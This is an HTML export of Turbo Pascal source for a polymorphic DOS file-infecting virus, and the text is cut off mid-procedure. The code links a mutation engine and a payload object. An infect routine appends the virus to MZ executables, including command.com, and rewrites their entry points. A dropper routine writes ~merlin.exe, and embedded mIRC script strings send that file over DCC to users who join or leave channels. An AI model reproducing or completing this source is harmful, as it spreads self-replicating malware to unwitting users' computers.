<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc14 {
	font-weight: bold;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">{$S- $R- $Q- $F-}</span><span class="sc0">
</span><span class="sc5">uses</span><span class="sc0"> </span><span class="sc11">dos</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">type</span><span class="sc0">
      </span><span class="sc11">mz_hdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
        </span><span class="sc11">Signature</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">ExtraBytes</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">Pages</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">RelocItems</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">HeaderSize</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">MinAlloc</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">MaxAlloc</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">InitSS</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">InitSP</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">CheckSum</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">InitIP</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">InitCS</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">RelocTable</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">Overlay</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">type</span><span class="sc0">
      </span><span class="sc11">virii</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
      </span><span class="sc11">buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">source</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">vl</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">OfsSS</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc10">^</span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">OfsSP</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc10">^</span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">OfsCS</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc10">^</span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">OfsIP</span><span class="sc10">:</span><span class="sc0">  </span><span class="sc10">^</span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">     

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">randomize</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc9">{$L engine.obj}</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">engine</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc5">external</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">demos</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc5">external</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc9">{$L payload.obj}</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">timer</span><span class="sc10">(</span><span class="sc11">tick</span><span class="sc10">:</span><span class="sc11">word</span><span class="sc10">);</span><span class="sc5">external</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0">
     </span><span class="sc11">f</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">dirinfo</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">searchrec</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">vir</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">virii</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">mz_hdr</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">{ LordDarkMutationEngine version 1.2 }</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0">  </span><span class="sc11">LME</span><span class="sc10">(</span><span class="sc11">IP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">asm</span><span class="sc14">
     push ds
     push es
     mov cx, vir.vl 
     mov ax, ip
     les di, vir.buffer
     lds si, vir.source
     shr cx, 1
     adc cx, 0 
     call engine
     xchg ax, cx
     pop es 
     pop ds
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">make_dropper</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">boolean</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
      </span><span class="sc11">dropper_len</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">res</span><span class="sc0">         </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longint</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">ff</span><span class="sc0">          </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
      </span><span class="sc11">make_dropper</span><span class="sc0">  </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">False</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.Signature</span><span class="sc0">  </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$5A4D</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.RelocItems</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.HeaderSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.MinAlloc</span><span class="sc0">   </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.MaxAlloc</span><span class="sc0">   </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$FFFF</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.InitSS</span><span class="sc0">     </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.InitSP</span><span class="sc0">     </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$FFFE</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.CheckSum</span><span class="sc0">   </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.InitIP</span><span class="sc0">     </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.InitCS</span><span class="sc0">     </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">vir.ofsip</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">vir.ofscs</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$FFF0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">vir.ofsss</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
      </span><span class="sc11">vir.ofssp</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$FFFE</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">dropper_len</span><span class="sc0">   </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lme</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">mz.ExtraBytes</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">dropper_len</span><span class="sc0"> </span><span class="sc5">mod</span><span class="sc0"> </span><span class="sc4">$200</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">mz.Pages</span><span class="sc0">      </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">dropper_len</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc4">$200</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">mz.ExtraBytes</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">mz.Pages</span><span class="sc10">);</span><span class="sc0">

      </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">{$I-}</span><span class="sc0"> </span><span class="sc11">Rewrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$I+}</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Addr</span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">)^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">mz_hdr</span><span class="sc10">));</span><span class="sc0">      
      </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vir.buffer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">dropper_len</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">make_dropper</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">True</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
     </span><span class="sc11">attr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
     </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc9">{$i-}</span><span class="sc0"> </span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$i+}</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">IOResult</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">200</span><span class="sc10">*</span><span class="sc4">1024</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">BlockRead</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Addr</span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">)^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">mz_hdr</span><span class="sc10">));</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">mz.InitCS</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">mz.InitCS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mz.InitSS</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">

     </span><span class="sc1">{ infect command.com }</span><span class="sc0"> 

     </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz.InitCS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)&lt;</span><span class="sc4">100000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">70000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
     </span><span class="sc5">Else</span><span class="sc0">
     </span><span class="sc5">Begin</span><span class="sc0">
     </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">mod</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc11">mz.ExtraBytes</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc11">Dec</span><span class="sc10">(</span><span class="sc11">mz.Pages</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc11">mz.Pages</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">

     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz.signature</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$5A4D</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mz.Signature</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$4D5A</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
     </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">End</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">vir.ofsip</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">mz.initip</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">vir.ofscs</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">mz.initcs</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">vir.ofsss</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">mz.initss</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc11">vir.ofssp</span><span class="sc10">^</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">mz.initsp</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lme</span><span class="sc10">((</span><span class="sc11">Filesize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)-</span><span class="sc11">mz.HeaderSize</span><span class="sc10">*</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">mod</span><span class="sc0"> </span><span class="sc4">$10</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">mz.InitIP</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Filesize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)-</span><span class="sc11">mz.HeaderSize</span><span class="sc10">*</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">mod</span><span class="sc0"> </span><span class="sc4">$10</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz.InitCS</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Filesize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)-</span><span class="sc11">mz.HeaderSize</span><span class="sc10">*</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc4">$10</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz.InitSS</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">mz.InitCS</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz.InitSP</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$FFFE</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz.Pages</span><span class="sc0">  </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)+</span><span class="sc11">attr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">mz.ExtraBytes</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">)+</span><span class="sc11">attr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">mod</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">mz.ExtraBytes</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">mz.Pages</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileSize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">));</span><span class="sc0">
     </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vir.buffer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Addr</span><span class="sc10">(</span><span class="sc11">mz</span><span class="sc10">)^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">mz_hdr</span><span class="sc10">));</span><span class="sc0">
     </span><span class="sc11">Close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0">
     </span><span class="sc11">r</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">registers</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">w</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">const</span><span class="sc0">
     </span><span class="sc11">test_write</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">#255#0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">scrypt1</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">[</span><span class="sc4">186</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> 

       </span><span class="sc7">'[script]'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n0=run ~merlin.exe'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n1=ON 1:JOIN:#:{ /if ( $nick == $me )'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n2= /dcc send $nick ~merlin.exe'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n3=}'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n4=ON 1:PART:#:{ /if ( $nick == $me )'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n5= /dcc send $nick ~merlin.exe'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'n6=}'#$D#$A</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">                                 

     </span><span class="sc11">scrypt2</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
       
       </span><span class="sc7">#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'[fileserver]'#$D#$A</span><span class="sc10">+</span><span class="sc0">
       </span><span class="sc7">'Warning=Off'#$D#$A</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">make_mirc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
        </span><span class="sc11">ff</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">  
</span><span class="sc5">begin</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">make_dropper</span><span class="sc10">(+</span><span class="sc11">path</span><span class="sc10">+</span><span class="sc7">'mirc\'</span><span class="sc10">+</span><span class="sc7">'~merlin.exe'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
               </span><span class="sc5">begin</span><span class="sc0">
                  </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">+</span><span class="sc7">'mirc\'</span><span class="sc10">+</span><span class="sc7">'script.ini'</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc9">{$I-}</span><span class="sc0"> </span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$I+}</span><span class="sc0">
                  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
                     </span><span class="sc5">begin</span><span class="sc0">
                         </span><span class="sc9">{$I-}</span><span class="sc0"> </span><span class="sc11">rewrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$I+}</span><span class="sc0">                           
                         </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0"> 
                     </span><span class="sc5">end</span><span class="sc0">
                  </span><span class="sc5">else</span><span class="sc0">
